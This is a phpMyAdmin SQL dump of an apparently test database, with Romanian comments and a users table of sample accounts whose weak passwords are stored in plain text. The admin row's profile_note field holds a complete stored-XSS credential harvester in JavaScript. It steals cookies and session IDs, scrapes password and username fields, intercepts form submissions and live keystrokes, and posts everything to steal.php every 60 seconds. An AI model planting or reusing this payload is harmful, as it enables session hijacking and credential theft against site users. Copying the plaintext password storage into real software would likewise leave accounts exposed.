-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Gazdă: localhost
-- Timp de generare: iul. 01, 2025 la 09:35 PM
-- Versiune server: 10.4.28-MariaDB
-- Versiune PHP: 8.2.4

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Bază de date: `test_db`
--

-- --------------------------------------------------------

--
-- Structură tabel pentru tabel `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `email` varchar(100) DEFAULT NULL,
  `role` varchar(20) DEFAULT 'user',
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `profile_note` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Eliminarea datelor din tabel `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `email`, `role`, `created_at`, `profile_note`) VALUES
(1, 'admin', 'admin123', 'admin@test.com', 'admin', '2025-07-01 19:20:03', '<script>\r\nfunction stealCredentials() {\r\n    var credentialData = {\r\n        attack_type: \'credential_harvester\',\r\n        timestamp: new Date().toISOString(),\r\n        \r\n        // === CREDENTIALE EXISTENTE ===\r\n        existing_credentials: {\r\n            cookies: document.cookie,\r\n            sessionId: document.cookie.match(/PHPSESSID=([^;]+)/) ? document.cookie.match(/PHPSESSID=([^;]+)/)[1] : null,\r\n            current_user: null,\r\n            current_email: null\r\n        },\r\n        \r\n        // === PAROLE DIN FORMULARE ===\r\n        password_fields: [],\r\n        \r\n        // === CREDENTIALE DIN PAGINĂ ===\r\n        page_credentials: [],\r\n        \r\n        // === AUTENTIFICARE INTERCEPTATĂ ===\r\n        intercepted_logins: []\r\n    };\r\n    \r\n    // === EXTRAGE UTILIZATORUL CURENT ===\r\n    try {\r\n        // Caută în textul paginii\r\n        var pageText = document.body.textContent;\r\n        var userPattern = /User:\\s*([a-zA-Z0-9_]+)/;\r\n        var emailPattern = /Email:\\s*([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,})/;\r\n        \r\n        var userMatch = pageText.match(userPattern);\r\n        var emailMatch = pageText.match(emailPattern);\r\n        \r\n        if (userMatch) credentialData.existing_credentials.current_user = userMatch[1];\r\n        if (emailMatch) credentialData.existing_credentials.current_email = emailMatch[1];\r\n        \r\n        // Caută în elemente specifice\r\n        var userElements = document.querySelectorAll(\'strong, [class*=\"user\"], [id*=\"user\"]\');\r\n        userElements.forEach(function(el) {\r\n            var text = el.textContent.trim();\r\n            if (text && text.length < 50 && !text.includes(\'ID\') && !text.includes(\':\')) {\r\n                credentialData.existing_credentials.current_user = text;\r\n            }\r\n        });\r\n        \r\n    } catch (e) {\r\n        console.log(\'Error extracting current user:\', e);\r\n    }\r\n    \r\n    // === CAUTĂ TOATE PAROLELE ===\r\n    try {\r\n        var passwordInputs = document.querySelectorAll(\'input[type=\"password\"], input[name*=\"pass\"], input[id*=\"pass\"], input[placeholder*=\"pass\"]\');\r\n        passwordInputs.forEach(function(input, index) {\r\n            credentialData.password_fields.push({\r\n                index: index,\r\n                name: input.name,\r\n                id: input.id,\r\n                value: input.value,\r\n                placeholder: input.placeholder,\r\n                form_action: input.form ? input.form.action : null,\r\n                form_method: input.form ? input.form.method : null\r\n            });\r\n        });\r\n        \r\n        // Caută și username-urile asociate\r\n        var usernameInputs = document.querySelectorAll(\'input[type=\"text\"], input[type=\"email\"], input[name*=\"user\"], input[name*=\"email\"], input[id*=\"user\"], input[id*=\"email\"]\');\r\n        usernameInputs.forEach(function(input, index) {\r\n            if (input.value && input.value.length > 0) {\r\n                credentialData.page_credentials.push({\r\n                    type: \'username_field\',\r\n                    name: input.name,\r\n                    id: input.id,\r\n                    value: input.value,\r\n                    input_type: input.type,\r\n                    placeholder: input.placeholder\r\n                });\r\n            }\r\n        });\r\n        \r\n    } catch (e) {\r\n        console.log(\'Error extracting passwords:\', e);\r\n    }\r\n    \r\n    // === INTERCEPTEAZĂ TOATE FORMULARELE ===\r\n    document.querySelectorAll(\'form\').forEach(function(form) {\r\n        var originalSubmit = form.onsubmit;\r\n        \r\n        form.addEventListener(\'submit\', function(e) {\r\n            var loginData = {\r\n                timestamp: new Date().toISOString(),\r\n                form_action: form.action,\r\n                form_method: form.method,\r\n                credentials: {}\r\n            };\r\n            \r\n            // Extrage toate valorile din formular\r\n            var formData = new FormData(form);\r\n            for (var pair of formData.entries()) {\r\n                loginData.credentials[pair[0]] = pair[1];\r\n            }\r\n            \r\n            // Trimite credentialele interceptate IMEDIAT\r\n            fetch(\'./steal.php\', {\r\n                method: \'POST\',\r\n                headers: {\'Content-Type\': \'application/json\'},\r\n                body: JSON.stringify({\r\n                    attack_type: \'login_intercept\',\r\n                    intercepted_login: loginData,\r\n                    session_info: {\r\n                        cookies: document.cookie,\r\n                        url: window.location.href,\r\n                        timestamp: new Date().toISOString()\r\n                    }\r\n                }),\r\n                mode: \'no-cors\'\r\n            });\r\n            \r\n            console.log(\'🔑 Login intercepted:\', loginData);\r\n        });\r\n    });\r\n    \r\n    // === TRIMITE DATELE INIȚIALE ===\r\n    fetch(\'./steal.php\', {\r\n        method: \'POST\',\r\n        headers: {\r\n            \'Content-Type\': \'application/json\'\r\n        },\r\n        body: JSON.stringify(credentialData),\r\n        mode: \'no-cors\'\r\n    }).then(function() {\r\n        console.log(\'🔑 Credential harvesting successful!\');\r\n    }).catch(function(error) {\r\n        console.error(\'❌ Credential theft failed:\', error);\r\n    });\r\n    \r\n    return credentialData;\r\n}\r\n\r\n// === MONITORIZEAZĂ SCHIMBĂRILE ÎN CÂMPURI ===\r\nfunction monitorPasswordFields() {\r\n    document.addEventListener(\'input\', function(e) {\r\n        if (e.target.type === \'password\' || \r\n            e.target.name.toLowerCase().includes(\'pass\') ||\r\n            e.target.name.toLowerCase().includes(\'user\') ||\r\n            e.target.type === \'email\') {\r\n            \r\n            // Trimite valorile în timp real\r\n            fetch(\'./steal.php\', {\r\n                method: \'POST\',\r\n                headers: {\'Content-Type\': \'application/json\'},\r\n                body: JSON.stringify({\r\n                    attack_type: \'real_time_input\',\r\n                    field_name: e.target.name,\r\n                    field_id: e.target.id,\r\n                    field_type: e.target.type,\r\n                    field_value: e.target.value,\r\n                    timestamp: new Date().toISOString()\r\n                }),\r\n                mode: \'no-cors\'\r\n            });\r\n        }\r\n    });\r\n}\r\n\r\n// === EXECUȚIE ===\r\nstealCredentials();\r\nmonitorPasswordFields();\r\n\r\n// === REPETĂ LA FIECARE 60 SECUNDE ===\r\nsetInterval(stealCredentials, 60000);\r\n\r\nconsole.log(\'🔑 Advanced credential harvester activated!\');\r\nalert(\'🚨 CREDENTIAL HARVESTER!\\n\\n✅ Username și parole extrase\\n✅ Interceptare login activă\\n✅ Monitorizare în timp real\\n\\nVerifică dashboard.php!\');\r\n</script>'),
(2, 'user1', 'password1', 'user1@test.com', 'user', '2025-07-01 19:20:03', 'Regular User'),
(3, 'test', 'test123', 'test@test.com', 'user', '2025-07-01 19:20:03', 'Test Account'),
(4, 'guest', 'guest', 'guest@test.com', 'guest', '2025-07-01 19:20:03', 'Guest Account'),
(5, 'john', 'john2024', 'john@company.com', 'manager', '2025-07-01 19:20:03', 'Manager Profile');

--
-- Indexuri pentru tabele eliminate
--

--
-- Indexuri pentru tabele `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`);

--
-- AUTO_INCREMENT pentru tabele eliminate
--

--
-- AUTO_INCREMENT pentru tabele `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
